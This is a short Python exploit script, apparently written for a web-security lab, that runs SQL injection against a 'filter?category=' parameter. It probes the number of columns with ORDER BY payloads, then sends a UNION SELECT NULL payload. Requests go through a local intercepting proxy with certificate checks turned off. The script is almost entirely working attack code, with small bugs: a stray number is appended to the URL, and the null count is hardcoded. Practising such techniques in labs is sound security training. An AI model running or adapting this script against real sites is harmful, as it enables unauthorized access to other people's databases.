import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit(url):
    for i in range(1,10):
        p = "'+order+by+%s--+-" % str(i)
        u = url  + str(i) + p
        r = requests.get(u, verify=False, proxies=proxies)
        print("Try #%s" % str(i))
        if "Internal Server Error" in r.text:
            return i -1
    return False


def main():
    try:
        url = sys.argv[1] + "filter?category="
    except IndexError:
        print("Usage: %s <BaseURL>" % sys.argv[0])

    x = exploit(url)
    if x != False:
        print("Success - %s columns" % x)
        n = "null,"*3
        nc = n[:-1]
        res = requests.get(url + "'+union+select+%s--+-" % nc, verify=False, proxies=proxies)

if __name__ == '__main__':
    main()
